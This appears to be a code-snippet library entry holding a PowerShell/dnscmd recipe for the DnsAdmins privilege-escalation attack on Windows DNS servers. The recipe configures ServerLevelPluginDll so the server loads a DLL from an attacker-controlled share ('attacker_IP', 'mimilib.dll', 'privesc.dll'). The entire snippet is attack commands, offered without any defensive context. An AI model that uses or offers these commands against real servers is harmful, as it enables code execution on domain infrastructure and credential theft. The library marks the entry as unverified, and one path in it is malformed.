---
id: a5c014f2-69ad-49a3-9829-73ea7f5d1402
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:06.474723+00:00'
updated_at: '2023-04-10T20:26:10.320895+00:00'
---

# Code Snippet a5c014f2

**Language**: ps1

```ps1
# with RSAT
dnscmd <servername> /config /serverlevelplugindll \\attacker_IP\dll\mimilib.dll
dnscmd 10.10.10.11 /config /serverlevelplugindll \\10.10.10.10\exploit\privesc.dll

# with DNSServer module
$dnsettings = Get-DnsServerSetting -ComputerName <servername> -Verbose -All
$dnsettings.ServerLevelPluginDll = "\attacker_IP\dll\mimilib.dll"
Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose
```


